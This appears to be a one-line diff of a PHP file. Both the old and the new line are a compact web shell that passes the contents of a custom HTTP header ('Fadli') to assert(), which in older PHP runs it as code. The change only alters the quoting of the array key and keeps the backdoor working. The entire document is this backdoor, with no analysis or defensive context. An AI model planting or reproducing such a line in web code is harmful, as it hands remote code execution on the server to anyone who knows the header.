@@ -1,1 +1,1 @@
-<?=assert($_SERVER['HTTP_FADLI']);?>
+<?=assert($_SERVER[HTTP_FADLI]);?>
